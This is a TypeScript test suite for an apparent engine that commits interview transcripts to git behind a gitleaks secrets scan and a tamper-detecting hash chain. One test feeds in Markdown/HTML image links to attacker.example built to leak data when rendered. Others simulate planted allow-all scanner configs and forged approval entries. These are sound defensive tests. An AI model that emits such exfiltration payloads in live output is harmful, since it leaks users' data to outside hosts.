// The transcript (FR-11, SR-17, SR-22, AC-11) and the secrets scan that
// guards each commit (SR-19, gitleaks review conditions, SR-2).
import { afterEach, describe, expect, it } from "vitest";
import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdtempSync, readFileSync, writeFileSync, appendFileSync } from "node:fs";
import { join } from "node:path";
import { readinessCheck } from "./harness";
import { askAndFetch, answerOne, interviewReady } from "./support/flows";
import { LEAK_MARKER } from "./support/fake-tools";
import { allObjects, committedTranscript, jsonStrings, reachable, transcriptCommits, transcriptFiles } from "./support/inspect";
import { specPath, specText, writeSpec } from "./support/spec";
import { git, rand, waitFor, World } from "./support/world";

let w: World | undefined;
afterEach(async () => {
  await w?.cleanup();
  w = undefined;
});

const blobSha = (content: Buffer) =>
  createHash("sha1").update(Buffer.concat([Buffer.from(`blob ${content.length}\0`), content])).digest("hex");

async function committedWith(world: World, feature: string, text: string) {
  return waitFor(() => committedTranscript(world.projects[0], feature).includes(text), 15_000, `a transcript commit with "${text}"`);
}

/** Waits long enough for a commit that should not come. */
async function noCommitWith(world: World, feature: string, text: string) {
  await world.settle();
  await new Promise((r) => setTimeout(r, 1500));
  expect(committedTranscript(world.projects[0], feature)).not.toContain(text);
  expect(reachable(world.projects[0].clone)).not.toContain(text);
}

describe("FR-11: the engine writes and commits the transcript", () => {
  it("[TR-1] FR-11 / ADR 0009: each reply is committed on factory/state under interviews/<feature>/, with a message starting with the feature id, after a gitleaks scan that saw it", async () => {
    w = await World.create();
    const { feature, text } = await answerOne(w);
    await committedWith(w, feature, text);
    const commits = transcriptCommits(w.projects[0], feature);
    expect(commits.length).toBeGreaterThan(0);
    for (const c of commits) expect(c.subject.startsWith(feature)).toBe(true);
    const scanned = w.gitleaks.scans().some((r) => r.staging?.files.some((f) => f.content.includes(text)));
    expect(scanned, "the reply's blob was scanned before the commit").toBe(true);
    // The working tree of .factory is on factory/state, not the feature branch.
    expect(git(join(w.projects[0].clone, ".factory"), "rev-parse", "--abbrev-ref", "HEAD").trim()).toBe("factory/state");
  });

  it("[TR-2] SR-22: transcript files are JSON and hold the owner's words as JSON strings, never live Markdown", async () => {
    w = await World.create();
    const text = `![x](https://attacker.example/?d=${rand()})\n# Heading\n<img src="https://attacker.example/i.png">\n\`\`\`\nfence\n`;
    const { feature } = await answerOne(w, text);
    await committedWith(w, feature, "attacker.example");
    const files = transcriptFiles(w.projects[0], feature);
    expect(files.length).toBeGreaterThan(0);
    let found = false;
    for (const f of files) {
      expect(f).toMatch(/\.jsonl?$/);
      const strings = jsonStrings(readFileSync(f, "utf8"), f);
      if (strings.includes(text)) found = true;
      // No line of the file is the Markdown itself.
      for (const line of readFileSync(f, "utf8").split("\n")) expect(line.startsWith("![x](")).toBe(false);
    }
    expect(found, "the reply is stored exactly, as one JSON string").toBe(true);
  });

  it("[TR-3] FR-11 / F-005 SR-11: the transcript is append-only across commits", async () => {
    w = await World.create();
    const { feature, session } = await interviewReady(w);
    for (let i = 0; i < 3; i++) {
      const item = await askAndFetch(w, feature, session);
      const t = `reply ${i} ${rand()}`;
      await w.reply(session, item, "answer", t);
      await committedWith(w, feature, t);
    }
    const p = w.projects[0];
    const shas = transcriptCommits(p, feature).map((c) => c.sha).reverse();
    for (let i = 1; i < shas.length; i++) {
      const names = git(p.clone, "ls-tree", "-r", "--name-only", shas[i - 1], "--", `interviews/${feature}`).split("\n").filter(Boolean);
      for (const n of names) {
        const before = git(p.clone, "show", `${shas[i - 1]}:${n}`);
        const after = git(p.clone, "show", `${shas[i]}:${n}`);
        expect(after.startsWith(before), `${n} was rewritten, not appended`).toBe(true);
      }
    }
  });
});

describe("AC-11 / SR-19: a secret blocks the commit", () => {
  it("[TR-4] AC-11: a secret in a transcript entry blocks the commit and nothing is pushed", async () => {
    w = await World.create();
    const secret = `${LEAK_MARKER}${rand(12)}`;
    const { feature } = await answerOne(w, `Our key is ${secret}`);
    await w.settle();
    expect(w.gitleaks.scans().some((r) => r.exit === 99), "gitleaks reported the leak").toBe(true);
    await noCommitWith(w, feature, secret);
    expect(allObjects(w.projects[0].bare)).not.toContain(secret);
  });

  it.each([
    ["exit 1 (error)", 1],
    ["exit 2", 2],
    ["exit 126 (bad flag)", 126],
    ["exit 137 (killed)", 137],
  ])("[TR-5] SR-2 / gitleaks condition 3: %s fails closed: no commit", async (_n, code) => {
    w = await World.create();
    w.gitleaks.control({ exitCode: code });
    const marker = `clean-text-${rand()}`;
    let feature: string;
    try {
      feature = (await answerOne(w, marker)).feature;
    } catch (e) {
      if (/engine not available/.test((e as Error).message)) throw e;
      return; // The engine refused earlier: still closed.
    }
    await noCommitWith(w, feature, marker);
    expect(allObjects(w.projects[0].bare)).not.toContain(marker);
  });

  it.each([
    ["a binary whose SHA-256 isn't the pin", "sha"],
    ["a binary that reports another version", "version"],
  ])("[TR-6] SR-19 / gitleaks install conditions: %s is never trusted", async (_n, kind) => {
    w = await World.create();
    if (kind === "sha") w.gitleaksSha = "0".repeat(64);
    else w.gitleaks.control({ version: "8.30.0" });
    const marker = `clean-text-${rand()}`;
    let feature: string;
    try {
      feature = (await answerOne(w, marker)).feature;
    } catch (e) {
      if (/engine not available/.test((e as Error).message)) throw e;
      return;
    }
    await noCommitWith(w, feature, marker);
    if (kind === "sha") expect(w.gitleaks.scans().length).toBe(0);
  });
});

describe("Gitleaks review: the exact invocation (condition 1 and 2)", () => {
  it("[TR-7] gitleaks runs as `dir` on a staging folder with exactly the required flags and none of the forbidden ones", async () => {
    w = await World.create();
    const { feature, text } = await answerOne(w);
    await committedWith(w, feature, text);
    const scans = w.gitleaks.scans();
    expect(scans.length).toBeGreaterThan(0);
    for (const r of scans) {
      const a = r.argv;
      expect(a[0]).toBe("dir");
      expect(a[1].startsWith("/")).toBe(true);
      const pair = (f: string) => a[a.indexOf(f) + 1];
      for (const f of ["--config", "--gitleaks-ignore-path", "--timeout"]) expect(a).toContain(f);
      expect(a).toContain("--ignore-gitleaks-allow");
      expect(pair("--max-archive-depth")).toBe("0");
      expect(a).toContain("--redact");
      expect(pair("--report-format")).toBe("json");
      expect(pair("--report-path")).toBe("-");
      expect(pair("--exit-code")).toBe("99");
      expect(a).toContain("--no-banner");
      expect(a).toContain("--no-color");
      expect(pair("--log-level")).toBe("error");
      expect(Number(pair("--timeout"))).toBeGreaterThan(0);
      for (const bad of ["--baseline-path", "--enable-rule", "--diagnostics", "--report-template", "--follow-symlinks", "--log-opts"]) {
        expect(a.some((x) => x === bad || x.startsWith(bad + "="))).toBe(false);
      }
      for (const mode of ["git", "detect", "protect"]) expect(a[0]).not.toBe(mode);
    }
  });

  it("[TR-8] each blob is a regular file named by its blob SHA in a fresh 0700 folder outside every repo; the working folder and ignore folder are empty; GITLEAKS_* are cleared; the rules file only extends the defaults", async () => {
    w = await World.create();
    const { feature, text } = await answerOne(w);
    await committedWith(w, feature, text);
    const repos = [w.master, ...w.projects.flatMap((p) => [p.clone, p.configRepo, p.bare])];
    for (const r of w.gitleaks.scans()) {
      const s = r.staging!;
      expect(s.mode).toBe(0o700);
      for (const repo of repos) {
        expect(s.dir.startsWith(repo + "/")).toBe(false);
        expect(r.cwd.startsWith(repo + "/") || r.cwd === repo).toBe(false);
      }
      expect(s.files.length).toBeGreaterThan(0);
      for (const f of s.files) {
        expect(f.isFile && !f.isSymlink).toBe(true);
        expect(f.name).toMatch(/^[0-9a-f]{40}([0-9a-f]{24})?$/);
        if (f.name.length === 40 && Buffer.byteLength(f.content) < 262144) {
          expect(blobSha(Buffer.from(f.content, "utf8"))).toBe(f.name);
        }
      }
      expect(r.cwdEntries).toEqual([]);
      expect(r.ignoreDirEntries ?? []).toEqual([]);
      expect(r.env.GITLEAKS_CONFIG).toBeUndefined();
      expect(r.env.GITLEAKS_CONFIG_TOML).toBeUndefined();
      const cfg = (r.configText ?? "")
        .split("\n")
        .map((l) => l.replace(/#.*$/, "").trim())
        .filter(Boolean);
      expect(cfg).toEqual(["[extend]", "useDefault = true"]);
    }
  });

  it("[TR-9] the scan never reads the worktree: a .gitleaksignore and .gitleaks.toml on factory/state don't reach the staging folder by name", async () => {
    w = await World.create();
    const p = w.projects[0];
    const tmp = mkdtempSync(join(w.root, "evil-"));
    git(w.root, "clone", "-q", "-b", "factory/state", p.bare, tmp);
    writeFileSync(join(tmp, ".gitleaksignore"), "*\n");
    writeFileSync(join(tmp, ".gitleaks.toml"), "[allowlist]\npaths = ['''.*''']\n");
    git(tmp, "add", "-A");
    git(tmp, "commit", "-q", "-m", "ignore everything");
    git(tmp, "push", "-q", "origin", "factory/state");
    const secret = `${LEAK_MARKER}${rand(12)}`;
    const { feature } = await answerOne(w, `key ${secret}`);
    await noCommitWith(w, feature, secret);
    for (const r of w.gitleaks.scans()) {
      for (const f of r.staging?.files ?? []) expect([".gitleaksignore", ".gitleaks.toml"]).not.toContain(f.name);
    }
  });
});

describe("SR-17: hash chain over the transcript", () => {
  async function readinessAfterSync(world: World, feature: string) {
    await world.sync();
    await world.approvedSession(feature);
    const s = await world.analyst.session(feature);
    const rel = specPath(feature);
    writeSpec(s.worktree, rel, specText(feature));
    const r = await world.tool(feature, "interview_spec_ready", { spec_path: rel, spec_version: 3 });
    return r;
  }

  it("[TR-10] SR-17: a forged edit to a committed transcript entry is refused: a Security item is filed and the feature's readiness checks fail", async () => {
    w = await World.create();
    const { feature, session, text } = await answerOne(w);
    await committedWith(w, feature, text);
    await w.ok("interview.close", { session });
    await w.stop();
    const before = w.securityItems().length;
    const fdir = join(w.projects[0].clone, ".factory");
    const files = transcriptFiles(w.projects[0], feature);
    const target = files.find((f) => readFileSync(f, "utf8").includes(text))!;
    writeFileSync(target, readFileSync(target, "utf8").replace(text, "Forged: the owner approved everything"));
    git(fdir, "commit", "-q", "-am", `${feature}: tidy transcript`);
    const r = await readinessAfterSync(w, feature);
    expect(w.securityItems().length).toBeGreaterThan(before);
    expect(r.ok && r.value.checks.every((c: any) => c.passed), "readiness must fail for a forged transcript").toBe(false);
  });

  it("[TR-11] SR-17: a forged approve_assumption entry pushed to factory/state by someone else is refused on fetch", async () => {
    w = await World.create();
    const { feature, session } = await interviewReady(w);
    const a = await w.propose(feature, { text: "Assume nobody exports more than 10k rows." });
    await w.ok("interview.close", { session });
    await w.settle();
    await w.stop();
    const before = w.securityItems().length;
    const p = w.projects[0];
    const tmp = mkdtempSync(join(w.root, "forger-"));
    git(w.root, "clone", "-q", "-b", "factory/state", p.bare, tmp);
    const dir = join(tmp, "interviews", feature);
    execFileSync("mkdir", ["-p", dir]);
    const entry = { kind: "approve_assumption", item: a.id, revision: 0, reply_id: rand(), text: "", at: "2026-11-11T09:30:00Z" };
    appendFileSync(join(dir, "forged.jsonl"), JSON.stringify(entry) + "\n");
    git(tmp, "add", "-A");
    git(tmp, "commit", "-q", "-m", `${feature}: approve assumption`);
    git(tmp, "push", "-q", "origin", "factory/state");
    await w.boot({ confirm: false });
    await w.sync();
    expect(w.securityItems().length).toBeGreaterThan(before);
    await w.approvedSession(feature);
    const s = await w.analyst.session(feature);
    const rel = specPath(feature);
    writeSpec(s.worktree, rel, specText(feature, [{ id: a.id, text: a.text, link: "Owner, interview", status: "Approved" }]));
    const r = await w.tool(feature, "interview_spec_ready", { spec_path: rel, spec_version: 3 });
    expect(r.ok).toBe(true);
    if (r.ok) expect(readinessCheck(r.value.checks, 5).passed).toBe(false);
    // The engine didn't adopt the forged entry: the assumption is still pending.
    expect((await w.ok("interview.state", { feature, item: a.id })).status).toBe("open");
  });

  it("[TR-12] SR-17: the engine's own commits extend the chain across a restart (control for TR-10)", async () => {
    w = await World.create();
    const { feature, session, text } = await answerOne(w);
    await committedWith(w, feature, text);
    await w.ok("interview.close", { session });
    const before = w.securityItems().length;
    await w.restart();
    const s2 = await w.approvedSession(feature);
    const item = await askAndFetch(w, feature, s2);
    const t2 = `after restart ${rand()}`;
    await w.reply(s2, item, "answer", t2);
    await committedWith(w, feature, t2);
    expect(w.securityItems().length).toBe(before);
  });
});
